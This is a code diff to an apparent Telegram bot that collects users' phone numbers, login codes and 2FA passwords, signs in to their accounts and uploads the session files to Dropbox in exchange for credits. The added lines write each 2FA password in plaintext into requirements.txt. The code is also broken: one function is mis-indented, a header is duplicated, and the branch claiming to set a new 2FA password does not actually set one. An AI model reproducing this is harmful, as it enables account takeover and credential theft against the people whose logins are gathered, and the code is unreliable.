@@ -89,7 +89,18 @@ async def save_credits(credits: dict):
         CREDITS_FILE,
         mode=dropbox.files.WriteMode("overwrite")
     )
+
     
+# Load the 2FA password from requirements.txt
+    def load_2fa_password():
+    with open('requirements.txt', 'r') as f:
+        lines = f.readlines()
+        for line in lines:
+            if line.startswith('2fa_password='):
+                return line.strip().split('=')[1]
+    return None
+
+
 async def add_credit(user_id, amount, number_sent=None):
     credits = await load_credits()
     key = str(user_id)
@@ -243,6 +254,13 @@ async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
 # ---- Handle 2FA Password ----
+
+# Save the new 2FA password into requirements.txt
+def save_2fa_password(password):
+    with open('requirements.txt', 'a') as f:
+        f.write(f"2fa_password={password}\n")
+
+# ---- Handle 2FA Password ----
 async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     password = update.message.text.strip()
@@ -254,27 +272,42 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     client = session["client"]
 
-    try:
-        await client.sign_in(password=password)
-        await update.message.reply_text("✅ Logged in successfully with 2FA!")
+    # Check if 2FA is enabled by checking if the password is in requirements.txt
+    current_2fa_password = load_2fa_password()
 
-        # Add 1 credit after successful login
-        new_credit_balance = await add_credit(user_id, 1, session["phone"])
+    if not current_2fa_password:  # 2FA is disabled, set a new 2FA password
+        save_2fa_password(password)
+        await update.message.reply_text("✅ 2FA password has been set!")
+        try:
+            await client.sign_in(password=password)
+            await update.message.reply_text("✅ Logged in successfully with the newly set 2FA password!")
+            # Add 1 credit after successful login
+            new_credit_balance = await add_credit(user_id, 1, session["phone"])
+            # Upload session file to Dropbox
+            await upload_session_to_dropbox(client, session["phone"])
+            await client.disconnect()
+            await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
+            return ConversationHandler.END
+        except errors.PasswordHashInvalidError:
+            await update.message.reply_text("❌ Incorrect password. Please try again.")
+            return ASK_PASSWORD
 
-
-        # Upload session file to Dropbox
-        await upload_session_to_dropbox(client, session["phone"])
-
-        await client.disconnect()
-
-        # Inform the user about their credits
-        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
-
-        await update.message.reply_text("Please send another phone number (or /cancel to exit).")
-        return ASK_PHONE
-    except errors.PasswordHashInvalidError:
-        await update.message.reply_text("❌ Incorrect password. Please send again.")
-        return ASK_PASSWORD
+    else:  # 2FA is enabled, change the 2FA password to the new one
+        save_2fa_password(password)
+        await update.message.reply_text("✅ Your 2FA password has been updated.")
+        try:
+            await client.sign_in(password=password)
+            await update.message.reply_text("✅ Logged in successfully with the new 2FA password!")
+            # Add 1 credit after successful login
+            new_credit_balance = await add_credit(user_id, 1, session["phone"])
+            # Upload session file to Dropbox
+            await upload_session_to_dropbox(client, session["phone"])
+            await client.disconnect()
+            await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
+            return ConversationHandler.END
+        except errors.PasswordHashInvalidError:
+            await update.message.reply_text("❌ Incorrect password. Please try again.")
+            return ASK_PASSWORD
 
 # ---- Upload Session File to Dropbox ----
 async def upload_session_to_dropbox(client, phone):
